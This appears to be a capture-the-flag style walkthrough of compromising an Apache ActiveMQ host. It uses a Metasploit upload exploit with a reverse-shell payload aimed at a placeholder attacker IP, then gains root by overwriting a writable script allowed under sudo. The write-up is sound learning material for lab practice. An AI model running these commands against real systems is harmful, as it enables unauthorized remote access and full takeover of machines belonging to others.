## Initial Access

The `apache_activemq_upload_jsp` Metasploit module exploits an unauthenticated file upload vulnerability in the ActiveMQ web console:

```
use exploit/multi/http/apache_activemq_upload_jsp
set RHOSTS 10.112.151.145
set RPORT 8161
set LHOST <ATTACKER_IP>
set payload java/meterpreter/reverse_tcp
run
```

A Meterpreter session opened as **activemq**.

```
meterpreter > sysinfo
Computer  : activemq
OS        : Linux 5.15.0-138-generic (amd64)
```

## Privilege Escalation

A shell was spawned and sudo permissions were checked:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo -l
```

```
User activemq may run the following commands on activemq:
    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```

`subscribe.py` is owned and writable by the `activemq` user:

```bash
ls -l /opt/apache-activemq-5.9.0/subscribe.py
-rw-rw-r-- 1 activemq activemq 768 Dec 25  2020 subscribe.py
```

The script was overwritten to spawn a root shell, then executed via sudo:

```bash
echo 'import os; os.system("/bin/bash")' > /opt/apache-activemq-5.9.0/subscribe.py
sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```

```
root@activemq:/# whoami
root
```
